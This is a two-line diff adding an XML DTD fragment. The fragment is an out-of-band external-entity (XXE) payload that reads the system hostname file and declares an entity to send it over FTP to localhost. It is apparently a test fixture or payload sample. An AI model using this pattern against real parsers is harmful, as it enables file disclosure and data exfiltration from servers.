@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///proc/sys/kernel/hostname">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'ftp://localhost/%data;'>">
